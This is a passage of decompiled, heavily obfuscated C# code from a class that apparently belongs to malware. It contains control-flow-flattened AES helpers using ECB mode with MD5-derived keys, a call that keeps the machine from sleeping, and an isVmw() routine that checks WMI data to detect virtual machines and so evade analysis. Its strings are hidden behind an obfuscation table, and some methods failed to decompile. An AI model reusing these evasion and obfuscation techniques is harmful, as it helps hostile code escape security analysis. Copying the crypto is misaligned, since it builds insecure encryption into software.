label_11:
          str = EXGuarder.\u003106A4C49;
          num1 = 1407907699;
          break;
        case 4:
label_9:
          str = EXGuarder.\u00326153771;
          num1 = 1407907699;
          break;
        case 5:
label_7:
          str = EXGuarder.\u0034D6D202A;
          num1 = 1407907699;
          break;
        default:
label_1:
          num1 = 952166813;
          break;
      }
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~(--num1 - 935120085 * (~-1138247433 ^ -357929216 ^ 1889939221)) ^ -81161765)) % 11U)
        {
          case 0:
            goto label_9;
          case 1:
            goto label_3;
          case 2:
            goto label_7;
          case 3:
            str = EXGuarder.\u0033D622D3C;
            num1 = (int) num2 * -955055484 ^ 1807026031;
            continue;
          case 5:
            num1 = (int) num2 * -974291996 ^ -795208197;
            continue;
          case 6:
            num1 = (int) num2 * -253751222 ^ -180453511;
            continue;
          case 7:
            goto label_10;
          case 8:
            goto label_11;
          case 9:
            goto label_4;
          case 10:
            goto label_1;
          default:
            goto label_12;
        }
      }
label_12:
      return str;
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern Codes.EXECUTION_STATE SetThreadExecutionState(
      Codes.EXECUTION_STATE esflags);

    private static Codes.EXECUTION_STATE Power()
    {
      // ISSUE: unable to decompile the method.
    }

    public static void AcquirePower()
    {
      // ISSUE: unable to decompile the method.
    }

    public static string AES_Encrypt(string input, string pass)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      string base64String = EXGuarder.\u0033D403C01;
label_1:
      int num1 = 166316526;
      ASCIIEncoding asciiEncoding;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-877699935 * 1355343209 + (-1122753710 - 1319522647) - (~(num2 * -1002343987) ^ -(1259315499 * 1556643501 + -1227063750 * -374892859)))) % 3U)
        {
          case 1:
            asciiEncoding = new ASCIIEncoding();
            num1 = (int) num3 * -1046577029 ^ -782508971;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      byte[] bytes1 = asciiEncoding.GetBytes(pass);
      string str;
      try
      {
        rijndaelManaged.Key = bytes1;
label_6:
        int num4 = -1118767218;
        while (true)
        {
          int num5 = num4;
          uint num6;
          byte[] bytes2;
          ICryptoTransform encryptor;
          switch ((num6 = (uint) (-877699935 * 1355343209 + (-1122753710 - 1319522647) - (~(num5 * -1002343987) ^ -(1259315499 * 1556643501 + -1227063750 * -374892859)))) % 7U)
          {
            case 0:
              goto label_6;
            case 1:
              rijndaelManaged.Mode = CipherMode.ECB;
              num4 = (int) num6 * 1315526075 ^ -2143631339;
              continue;
            case 2:
              bytes2 = System.Text.Encoding.ASCII.GetBytes(input);
              num4 = (int) num6 * 843780166 ^ 2022524867;
              continue;
            case 3:
              encryptor = rijndaelManaged.CreateEncryptor();
              num4 = (int) num6 * -1383694628 ^ -1132915163;
              continue;
            case 4:
              base64String = Convert.ToBase64String(encryptor.TransformFinalBlock(bytes2, 0, bytes2.Length));
              num4 = (int) num6 * 1776060731 ^ -715466170;
              continue;
            case 6:
              str = base64String;
              num4 = (int) num6 * 1616423693 ^ 903708655;
              continue;
            default:
              goto label_15;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      str = EXGuarder.\u0033D403C01;
label_15:
      return str;
    }

    public static string AES_Decrypt(string text, string password)
    {
      string str1;
      try
      {
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
label_1:
        int num1 = 1410305517;
        byte[] hash;
        byte[] destinationArray;
        ICryptoTransform decryptor;
        byte[] inputBuffer;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-num1 * -1048760905 + 1917199064 * 1411221693)) % 11U)
          {
            case 0:
              Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
              num1 = (int) num2 * -558301452 ^ 1958675487;
              continue;
            case 1:
              Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
              num1 = (int) num2 * -1875154637 ^ 760566785;
              continue;
            case 2:
              string str2 = EXGuarder.\u00334343131;
              num1 = (int) num2 * -109177029 ^ -1638970801;
              continue;
            case 3:
              decryptor = rijndaelManaged.CreateDecryptor();
              num1 = (int) num2 * -1533808273 ^ -546016462;
              continue;
            case 4:
              rijndaelManaged.Key = destinationArray;
              rijndaelManaged.Mode = CipherMode.ECB;
              num1 = (int) num2 * -291562096 ^ 160689180;
              continue;
            case 5:
              hash = cryptoServiceProvider.ComputeHash(System.Text.Encoding.ASCII.GetBytes(password));
              num1 = (int) num2 * -395019845 ^ 830574470;
              continue;
            case 6:
              inputBuffer = Convert.FromBase64String(text);
              num1 = (int) num2 * -1467302487 ^ 1772219735;
              continue;
            case 8:
              str1 = System.Text.Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
              num1 = (int) num2 * -209926547 ^ 2014768479;
              continue;
            case 9:
              goto label_1;
            case 10:
              destinationArray = new byte[32];
              num1 = (int) num2 * 2094328870 ^ -1222951889;
              continue;
            default:
              goto label_17;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_13:
        int num3 = -1544292781;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) -(-num3 * -1048760905 + 1917199064 * 1411221693)) % 4U)
          {
            case 0:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * -198321687 ^ -1998142223;
              continue;
            case 1:
              str1 = EXGuarder.\u00334343131;
              num3 = (int) num4 * -347679622 ^ 1655589338;
              continue;
            case 2:
              goto label_13;
            default:
              goto label_17;
          }
        }
      }
label_17:
      return str1;
    }

    public static string Encrypt(string text, string password)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
label_1:
      int num1 = -1229095514;
      string base64String;
      while (true)
      {
        int num2 = num1;
        uint num3;
        ICryptoTransform encryptor;
        byte[] bytes;
        MD5CryptoServiceProvider cryptoServiceProvider;
        byte[] destinationArray;
        switch ((num3 = (uint) (105101672 - ((~num2 ^ -765808840 - (-1031095129 - 2034216118 - ~(1753378677 ^ 391378377)) ^ ~491860642) - 306740655 * (26877982 - 2012415219) ^ -1361970793 ^ 1676500392))) % 8U)
        {
          case 0:
            goto label_1;
          case 1:
            rijndaelManaged.Mode = CipherMode.ECB;
            num1 = (int) num3 * -1149141072 ^ -356982749;
            continue;
          case 2:
            cryptoServiceProvider = new MD5CryptoServiceProvider();
            num1 = (int) num3 * -501239622 ^ -1507789725;
            continue;
          case 3:
            string str = EXGuarder.\u0033B0E4124;
            destinationArray = new byte[32];
            num1 = (int) num3 * 911278870 ^ 146297523;
            continue;
          case 5:
            byte[] hash = cryptoServiceProvider.ComputeHash(System.Text.Encoding.ASCII.GetBytes(password));
            Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
            Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
            rijndaelManaged.Key = destinationArray;
            num1 = (int) num3 * 1698354193 ^ 2106369088;
            continue;
          case 6:
            base64String = Convert.ToBase64String(encryptor.TransformFinalBlock(bytes, 0, bytes.Length));
            num1 = (int) num3 * -157198219 ^ -801524114;
            continue;
          case 7:
            encryptor = rijndaelManaged.CreateEncryptor();
            bytes = System.Text.Encoding.ASCII.GetBytes(text);
            num1 = (int) num3 * 493087513 ^ -2047239731;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return base64String;
    }

    public static string Encrypt2(string text, string password)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
label_1:
      int num1 = 1422968375;
      byte[] bytes;
      ICryptoTransform encryptor;
      string base64String;
      string str1;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 * -1149229743) - -(816928726 + 1372582945 - (1030883816 - -397059816)) - (~311156930 ^ --940954870))) % 7U)
        {
          case 0:
            base64String = Convert.ToBase64String(encryptor.TransformFinalBlock(bytes, 0, bytes.Length));
            num1 = (int) num2 * -920269959 ^ -599592953;
            continue;
          case 1:
            MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
            num1 = (int) num2 * -169181174 ^ 1894875146;
            continue;
          case 2:
            goto label_1;
          case 3:
            str1 = base64String;
            num1 = (int) num2 * 1722993403 ^ -633190988;
            continue;
          case 4:
            string str2 = EXGuarder.\u00304670975;
            rijndaelManaged.Key = System.Text.Encoding.ASCII.GetBytes(password);
            rijndaelManaged.Mode = CipherMode.ECB;
            encryptor = rijndaelManaged.CreateEncryptor();
            num1 = (int) num2 * -433800437 ^ 213422264;
            continue;
          case 6:
            bytes = System.Text.Encoding.ASCII.GetBytes(text);
            num1 = (int) num2 * 1995339237 ^ 501451497;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return str1;
    }

    public static string AesDecrypt(string input, string pass)
    {
label_0:
      int num1 = -694809544;
      RijndaelManaged rijndaelManaged;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 ^ ((-774166256 - (2015691539 - 1623145524) ^ -670337979 * -945100481 * -817103507) - -(2144771168 ^ 2084267627 ^ -1607915067 - -325526446)) * 965999477) - ((-449480502 - -896481477 ^ 148843336 ^ -507188831) + -(1095622318 ^ -637740014)))) % 5U)
        {
          case 1:
            rijndaelManaged = new RijndaelManaged();
            num1 = (int) num2 * 1605035519 ^ 837839735;
            continue;
          case 2:
            string str = EXGuarder.\u0035F261446;
            num1 = (int) num2 * 1858951992 ^ -1972916044;
            continue;
          case 3:
            MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
            num1 = (int) num2 * 1438319309 ^ -1828084459;
            continue;
          case 4:
            goto label_0;
          default:
            goto label_5;
        }
      }
label_5:
      byte[] bytes = new ASCIIEncoding().GetBytes(pass);
      string str1;
      try
      {
        rijndaelManaged.Key = bytes;
label_7:
        int num3 = -156655811;
        ICryptoTransform decryptor;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (-(num3 ^ ((-774166256 - (2015691539 - 1623145524) ^ -670337979 * -945100481 * -817103507) - -(2144771168 ^ 2084267627 ^ -1607915067 - -325526446)) * 965999477) - ((-449480502 - -896481477 ^ 148843336 ^ -507188831) + -(1095622318 ^ -637740014)))) % 4U)
          {
            case 0:
              byte[] inputBuffer = Convert.FromBase64String(input);
              str1 = System.Text.Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
              num3 = (int) num4 * 1017039741 ^ 91334911;
              continue;
            case 2:
              goto label_7;
            case 3:
              rijndaelManaged.Mode = CipherMode.ECB;
              decryptor = rijndaelManaged.CreateDecryptor();
              num3 = (int) num4 * 604182872 ^ -407358728;
              continue;
            default:
              goto label_16;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_12:
      int num5 = -480419369;
      while (true)
      {
        uint num6;
        switch ((num6 = (uint) (-(num5 ^ ((-774166256 - (2015691539 - 1623145524) ^ -670337979 * -945100481 * -817103507) - -(2144771168 ^ 2084267627 ^ -1607915067 - -325526446)) * 965999477) - ((-449480502 - -896481477 ^ 148843336 ^ -507188831) + -(1095622318 ^ -637740014)))) % 4U)
        {
          case 0:
            goto label_12;
          case 1:
            str1 = EXGuarder.\u0035F261446;
            num5 = (int) num6 * -507666529 ^ 2080666733;
            continue;
          case 2:
            num5 = (int) num6 * 169604539 ^ -143462681;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str1;
    }

    public static bool isVmw()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(EXGuarder.\u0032B40160B);
      bool flag;
      try
      {
        ManagementObjectCollection objectCollection = managementObjectSearcher.Get();
        try
        {
          ManagementObjectCollection.ManagementObjectEnumerator enumerator;
          try
          {
            enumerator = objectCollection.GetEnumerator();
label_7:
            int num1 = enumerator.MoveNext() ? -1001077277 : (num1 = 773086019);
            string lower;
            ManagementBaseObject current;
            while (true)
            {
              uint num2;
              switch ((num2 = (uint) (num1 * 146268549 * -894336571 - (1435479282 - 183823952 ^ --1154817852 - 2141364565 * -1822726827) - 1242624136)) % 9U)
              {
                case 0:
                  goto label_7;
                case 1:
                  int num3 = current[EXGuarder.\u0035361700E].ToString().ToUpperInvariant().Contains(EXGuarder.\u003230B3274) ? -835265958 : (num3 = -2138373707);
                  num1 = num3 ^ (int) num2 * -1538216861;
                  continue;
                case 2:
                  current = enumerator.Current;
                  lower = current[EXGuarder.\u00316534503].ToString().ToLower();
                  num1 = -1536340811;
                  continue;
                case 4:
                  goto label_27;
                case 5:
                  num1 = -1001077277;
                  continue;
                case 6:
                  int num4 = Operators.CompareString(current[EXGuarder.\u0035361700E].ToString(), EXGuarder.\u00316763049, false) == 0 ? -1380319039 : (num4 = -1884376728);
                  num1 = num4 ^ (int) num2 * 1980841941;
                  continue;
                case 7:
                  int num5 = Operators.CompareString(lower, EXGuarder.\u0031602022B, false) != 0 ? 1570596142 : (num5 = 771960490);
                  num1 = num5 ^ (int) num2 * 483448813;
                  continue;
                case 8:
                  int num6;
                  num1 = num6 = lower.Contains(EXGuarder.\u00327143D42) ? 1066187189 : (num6 = -384517483);
                  continue;
                default:
                  goto label_11;
              }
            }
label_11:
            flag = true;
            goto label_28;
          }
          finally
          {
            if (enumerator != null)
            {
label_13:
              int num7 = -158948617;
              while (true)
              {
                uint num8;
                switch ((num8 = (uint) (num7 * 146268549 * -894336571 - (1435479282 - 183823952 ^ --1154817852 - 2141364565 * -1822726827) - 1242624136)) % 3U)
                {
                  case 1:
                    enumerator.Dispose();
                    num7 = (int) num8 * 1152434156 ^ 909326;
                    continue;
                  case 2:
                    goto label_13;
                  default:
                    goto label_16;
                }
              }
            }
label_16:;
          }
        }
        finally
        {
          if (objectCollection != null)
          {
label_18:
            int num9 = 390684213;
            while (true)
            {
              uint num10;
              switch ((num10 = (uint) (num9 * 146268549 * -894336571 - (1435479282 - 183823952 ^ --1154817852 - 2141364565 * -1822726827) - 1242624136)) % 3U)
              {
                case 1:
                  objectCollection.Dispose();
                  num9 = (int) num10 * -1680379394 ^ -632517271;
                  continue;
                case 2:
                  goto label_18;
                default:
                  goto label_21;
              }
            }
          }
label_21:;
        }
      }
      finally
      {
        if (managementObjectSearcher != null)
        {
label_23:
          int num11 = 837969768;
          while (true)
          {
            uint num12;
            switch ((num12 = (uint) (num11 * 146268549 * -894336571 - (1435479282 - 183823952 ^ --1154817852 - 2141364565 * -1822726827) - 1242624136)) % 3U)
            {
              case 1:
                managementObjectSearcher.Dispose();
                num11 = (int) num12 * -132946680 ^ -1381925569;
                continue;
              case 2:
                goto label_23;
              default:
                goto label_26;
            }
          }
        }
label_26:;
      }
label_27:
      flag = false;
label_28:
      return flag;
    }

    public Codes(Codes._Closure\u0024__43\u002D0 arg0)
    {
      if (arg0 == null)
        return;
      ((infoServer) this).\u0024VB\u0024Local_random = ((infoServer) arg0).\u0024VB\u0024Local_random;
    }

    [SpecialName]
    internal char _Lambda\u0024__0(string s)
    {
      return s[((infoServer) this).\u0024VB\u0024Local_random.Next(s.Length)];
    }

    private enum EXECUTION_STATE
    {
    }
  }
}
